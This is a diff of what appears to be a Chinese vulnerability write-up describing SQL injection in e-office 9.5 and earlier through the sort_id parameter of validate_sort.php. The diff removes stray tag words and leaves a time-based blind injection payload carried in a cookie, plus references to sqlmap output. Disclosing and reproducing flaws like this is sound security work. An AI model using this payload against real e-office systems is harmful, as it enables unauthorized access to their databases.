@@ -22,8 +22,6 @@ e-office <=9.5
 
 general/officeitem/sort/validate\_sort.php 业务逻辑如下
 
-编程
-
 ```
 <?php
 
@@ -45,14 +43,6 @@ if ( $row = mysql_fetch_row( $cursor ) )
 ?>
 ```
 
-深入探索
-
-网络安全
-
-计算机安全
-
-搜索引擎
-
 `sort_id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。
 
 # 漏洞复现
@@ -67,7 +57,7 @@ Cookie: sort_id=1 AND 4225=BENCHMARK(5000000,MD5(0x4567684e))
 
 成功延时 5 秒
 
-软件
+编程
 
 [sqlmap](https://mrxn.net/tag/sqlmap "sqlmap") 结果如下
 
@@ -86,5 +76,3 @@ Parameter: #1* (URI)
 ```
 
 validate\_number.php 也存在同样的问题。
-
-计算机安全
